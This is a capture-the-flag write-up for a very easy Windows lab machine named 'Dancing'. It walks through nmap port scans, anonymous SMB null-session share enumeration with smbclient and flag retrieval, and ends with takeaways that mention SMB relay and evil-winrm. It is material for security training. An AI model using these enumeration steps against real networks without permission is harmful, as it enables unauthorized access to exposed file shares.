---
IP: 10.129.1.12
OS: Windows
Level: Very Easy
Skills:
---
# 🩰 Dancing
<div class="machine-properties">
  <span class="prop-ip">10.129.1.12</span> <span class="prop-badge windows">Windows</span> <span class="prop-badge very-easy">Very Easy</span>
</div>


Dancing is a **Very Easy** Windows box that demonstrates how a misconfigured SMB server allowing anonymous access to network shares can lead to information disclosure.

---

## Recon

A full port scan reveals SMB plus **WinRM** (port 5985) — indicating a modern Windows host with remote management exposed:

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.1.12

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```

A service scan confirms Windows, reveals SMBv3.1.1 with **signing enabled but not required**, and exposes WinRM via HTTPAPI:

```
$ nmap -sCV -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.1.12

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m58s
| smb2-time:
|   date: 2026-06-01T23:59:17
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

Key findings:
- **SMB 3.1.1** — modern protocol version, signing available but not enforced (relevant for relay attacks)
- **WinRM (5985)** — potential lateral movement or privesc vector if credentials are obtained
- **High RPC ports** (49664–49669) — typical of Windows DCOM/RPC dynamic port allocation
- **Clock skew ~4h** — could indicate timezone mismatch between target and attacker

---

## Foothold

Enumerate available shares with a **null session** (blank password):

```
$ smbclient -L 10.129.1.12

Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\edu]:              <-- press Enter

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
SMB1 disabled -- no workgroup available
```

Key findings:
- **SMB1 disabled** — the host explicitly rejects legacy SMBv1 (mitigates EternalBlue-style attacks)
- **WorkShares** — the only non-default share; anonymous listing succeeds
- ADMIN$, C$, IPC$ are default administrative shares (require authentication)

Connect anonymously to `WorkShares` and explore both user directories:

```
$ smbclient \\\\10.129.1.12\\WorkShares

smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec)

smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec)
```

The flag is retrieved from `James.P\flag.txt`. The `worknotes.txt` in `Amy.J` is likely a rabbit hole or contextual lore.

---

## Key Takeaways

- **Null session SMB enumeration** is the first thing to try on any Windows box — `smbclient -L` with a blank password
- **SMB1 disabled** rules out EternalBlue (MS17-010); the host is modern enough to reject legacy SMBv1 explicitly
- **SMB signing enabled but not required** — if credentials were harvested, this opens the door to SMB relay attacks
- **WinRM (5985)** was exposed but not needed here — on a harder box, any found credentials could be leveraged via `evil-winrm` for a shell
- **Enumerate all user directories** inside accessible shares — the flag was a single `get` away in `James.P`
- Default shares (ADMIN$, C$, IPC$) require authentication — always look for custom shares like `WorkShares`
- No privilege escalation was needed — anonymous read access to the share was the entire attack surface
